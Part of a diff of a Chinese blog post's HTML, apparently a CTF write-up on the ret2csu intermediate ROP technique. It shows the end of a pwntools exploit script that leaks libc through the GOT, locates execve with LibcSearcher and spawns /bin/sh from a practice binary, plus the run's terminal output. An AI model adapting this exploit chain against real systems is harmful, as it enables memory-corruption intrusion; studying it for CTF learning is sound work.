class="line">log.info(<span class="string">&#x27;read_got:  &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">log.info(<span class="string">&#x27;main_addr: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(main_addr)))</span><br><span class="line">log.info(<span class="string">&#x27;bss_addr:  &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用libc_csu_init中后半部分的代码段建立函数，last为最后要返回到的函数（此题中为main函数）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># python3中不能直接加str和bytes了，所以这里用了bytes函数</span></span><br><span class="line">    payload  = <span class="built_in">bytes</span>(<span class="string">&quot;A&quot;</span> * offset, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    payload += p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx)</span><br><span class="line">    payload += p64(rbp)</span><br><span class="line">    payload += p64(r12)</span><br><span class="line">    payload += p64(r13)</span><br><span class="line">    payload += p64(r14)</span><br><span class="line">    payload += p64(r15)</span><br><span class="line">    payload += p64(csu_start_addr)</span><br><span class="line">    payload += <span class="built_in">bytes</span>(<span class="string">&quot;A&quot;</span> * pad_len, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    payload += p64(last)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 因为libc_csu_init代码段中call的是一个函数指针，所以这里用write_got而不是write_plt</span></span><br><span class="line"><span class="comment"># write(1, write_got, 8)读出libc中write的真正地址</span></span><br><span class="line">ret2csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line">libc_write_addr  = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.info(<span class="string">&#x27;libc_write_addr:  &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_write_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># LibSearcher可以通过write地址后12位找到所有可能的libc版本</span></span><br><span class="line">libc             = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, libc_write_addr)</span><br><span class="line"><span class="comment"># dump返回write函数地址</span></span><br><span class="line">libc_base        = libc_write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">libc_execve_addr = libc_base + libc.dump(<span class="string">&#x27;execve&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;libc_execve_addr: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_execve_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还是因为libc_csu_init调用的是函数指针，所以要把execve的地址放到一个什么地方去call</span></span><br><span class="line"><span class="comment"># 正好也把/bin/sh读进内存，都放到bss段</span></span><br><span class="line">read_to_bss      = p64(libc_execve_addr) + <span class="built_in">bytes</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment"># read(0, bss_addr, 16)将我们构造的16字节读进bss段开始</span></span><br><span class="line">ret2csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">16</span>, bss_addr, <span class="number">0</span>, main_addr)</span><br><span class="line">io.send(read_to_bss)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh&#x27;)获得shell</span></span><br><span class="line">ret2csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, <span class="number">0</span>, <span class="number">0</span>, bss_addr+<span class="number">8</span>, main_addr)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>脚本执行过程中会遇到让你选libc版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">temp@ubuntu:~/Desktop/advanced stackoverflow/ret2csu$ python3 exploit.py </span><br><span class="line">[*] &#x27;/home/temp/Desktop/advanced stackoverflow/ret2csu/level5&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Starting local process &#x27;./level5&#x27;: pid 5437</span><br><span class="line">[*] write_got: 0x601018</span><br><span class="line">[*] read_got:  0x601020</span><br><span class="line">[*] main_addr: 0x400587</span><br><span class="line">[*] bss_addr:  0x601040</span><br><span class="line">[*] libc_write_addr:  0x7fdd55173210</span><br><span class="line">[+] There are multiple libc that meet current constraints :</span><br><span class="line">0 - libc-2.32.9000-22.fc34.i686</span><br><span class="line">1 - libc6_2.27-3ubuntu1.4_amd64</span><br><span class="line">2 - libc-2.20-26.mga5.i586_2</span><br><span class="line">3 - libc-2.20-27.mga5.i586_2</span><br><span class="line">4 - libc6_2.26-0ubuntu2.1_i386</span><br><span class="line">5 - libc-2.18-9.9.mga4.i586</span><br><span class="line">6 - libc-2.29-20.mga7.x86_64</span><br><span class="line">7 - libc6-i386_2.30-0ubuntu2_amd64</span><br><span class="line">8 - libc6_2.27-3ubuntu1.3_amd64</span><br><span class="line">9 - libc6-x32_2.17-0ubuntu5_amd64</span><br><span class="line">[+] Choose one : 1</span><br><span class="line">[*] libc_execve_addr: 0x7fdd55147c00</span><br><span class="line">[*] Switching to interactive mode</span><br></pre></td></tr></table></figure>
+<p>这里面选1和8都行。因为我们是64位程序，所以直接排除所有x86的库（0，2，3，4，5），再排除运行在64位系统上的32位库（7，9），然后试了之后6不行（不知道6是干嘛的），1和8可以获得shell</p>
 
       
 
@@ -281,7 +209,7 @@ python compute.py /Apollo/recordresult/fusion</code></pre>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Research</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
       		
 		</ul>
@@ -337,7 +265,7 @@ python compute.py /Apollo/recordresult/fusion</code></pre>
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/01/08/Apollo5-0-AttackAPI/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/01/04/%E4%B8%AD%E7%BA%A7rop%E4%B9%8Bret2csu/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -351,18 +279,9 @@ python compute.py /Apollo/recordresult/fusion</code></pre>
   
 <nav id="article-nav">
   
-    <a href="/2021/01/09/Security-Test-1/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Security Test 1
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/01/08/Array/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Array</div>
+    <a href="/2022/01/04/%E5%88%9D%E7%BA%A7rop/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">初级rop</div>
       <i class="icon-circle-right"></i>
     </a>
   
